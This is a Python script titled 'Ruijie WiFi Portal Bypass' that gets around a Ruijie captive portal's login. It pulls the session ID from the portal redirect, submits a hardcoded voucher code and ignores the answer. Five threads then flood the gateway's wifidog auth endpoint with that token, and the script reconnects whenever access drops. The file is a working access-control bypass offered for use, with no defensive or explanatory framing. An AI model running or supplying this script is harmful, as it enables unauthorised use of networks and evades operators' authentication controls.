#!/usr/bin/env python3
"""
Ruijie WiFi Portal Bypass - Original working method from run.py
"""
import re, sys, threading, time, urllib.parse
import requests, urllib3
urllib3.disable_warnings()

PING_THREADS = 5
PING_INTERVAL = 0.1
ACCESS_CODE = "102762"

def internet_ok():
    try:
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except: return False

def fast_ping(sess, gw_addr, gw_port, sid, phone):
    url = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber={phone}"
    while True:
        try: sess.get(url, timeout=5)
        except: break
        time.sleep(PING_INTERVAL)

def main():
    print(f"[Ruijie Turbo Ping] Code: {ACCESS_CODE}")
    while True:
        sess = requests.Session()
        sess.headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
        sess.verify = False

        try:
            r = sess.get("http://connectivitycheck.gstatic.com/generate_204", timeout=10)
            if r.status_code == 204 and internet_ok():
                time.sleep(5); continue

            parsed = urllib.parse.urlparse(r.url)
            params = urllib.parse.parse_qs(parsed.query)
            host = f"{parsed.scheme}://{parsed.netloc}"
            gw_addr = params.get("gw_address", ["192.168.10.1"])[0]
            gw_port = params.get("gw_port", ["2060"])[0]

            # Get sessionId via portal chain
            r = sess.get(f"{host}/api/auth/wifidog?stage=portal&{parsed.query}", timeout=10)
            sid = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query).get("sessionId", [""])[0]
            if not sid:
                time.sleep(3); continue

            # Call voucher API (response ignored - just for logging)
            try:
                r = sess.post(f"{host}/api/auth/voucher/", json={
                    "accessCode": ACCESS_CODE, "sessionId": sid, "apiVersion": 1
                }, timeout=5)
                print(f"[Auth] {r.json().get('message','')}")
            except: pass

            phone = ACCESS_CODE
            print(f"[Ping] {gw_addr}:{gw_port}  sid={sid[:16]}...  phone={phone}  {PING_THREADS}tx")

            for _ in range(PING_THREADS):
                threading.Thread(target=fast_ping, args=(sess, gw_addr, gw_port, sid, phone), daemon=True).start()

            while internet_ok():
                time.sleep(3)
            print("[Disconnected] Reconnecting...")

        except KeyboardInterrupt:
            print("\nStopped"); sys.exit(0)
        except Exception as e:
            print(f"[!] {e}")
        finally:
            sess.close()
            time.sleep(3)

if __name__ == "__main__":
    main()
